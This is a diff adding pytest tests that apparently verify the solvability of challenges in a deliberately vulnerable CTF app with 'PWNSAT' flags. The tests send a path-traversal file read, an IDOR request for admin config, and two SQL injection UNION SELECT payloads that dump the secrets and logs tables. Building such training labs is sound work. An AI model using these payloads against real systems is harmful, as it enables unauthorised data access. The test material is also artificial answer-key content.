@@ -197,3 +197,45 @@ def test_gs12_debug_flags_listed_in_endpoints(app):
     resp = client.get("/api/endpoints")
     rules = [r["rule"] for r in resp.get_json()]
     assert "/api/debug/flags" in rules
+
+
+@pytest.fixture
+def auth_client(app):
+    client = app.test_client()
+    client.post("/login", data={"username": "operator", "password": "operator123"})
+    return client
+
+
+def test_gs04_lfi_flag_via_traversal(auth_client):
+    """GS-04: LFI reads lfi_flag.txt via path traversal."""
+    resp = auth_client.get("/api/logs?file=../lfi_flag.txt")
+    assert resp.status_code == 200
+    assert "PWNSAT{LFI_TRAVERSAL_SUCCESS}" in resp.get_json()["content"]
+
+
+def test_gs06_idor_flag_via_admin_config(operator_client):
+    """GS-06: Operator accesses admin's radio config and finds flag."""
+    resp = operator_client.get("/api/config/radio/1")
+    assert resp.status_code == 200
+    data = resp.get_json()
+    assert data["notes"] == "PWNSAT{IDOR_ADMIN_CONFIG}"
+
+
+def test_gs09_secrets_via_sqli(operator_client):
+    """GS-09: SQLi UNION SELECT on secrets table reveals flag."""
+    payload = "' UNION SELECT name,value,access_level,1,2,3,4,5,6,7,8,9,10 FROM secrets--"
+    resp = operator_client.get(f"/api/telemetry?search={payload}&limit=100")
+    assert resp.status_code == 200
+    data = resp.get_json()
+    found = any("PWNSAT{TELEMETRY_DB_TAMPERED}" in str(row.values()) for row in data)
+    assert found, "SQLi UNION on secrets should reveal GS-09 flag"
+
+
+def test_gs11_debug_log_via_sqli(operator_client):
+    """GS-11: SQLi UNION SELECT on logs table reveals hidden DEBUG flag."""
+    payload = "' UNION SELECT id,timestamp,level,source,message,6,7,8,9,10,11,12,13 FROM logs WHERE level='DEBUG'--"
+    resp = operator_client.get(f"/api/telemetry?search={payload}&limit=100")
+    assert resp.status_code == 200
+    data = resp.get_json()
+    found = any("PWNSAT{LOG_INJECTION_SUCCESS}" in str(row.values()) for row in data)
+    assert found, "SQLi UNION on logs should reveal GS-11 DEBUG flag"
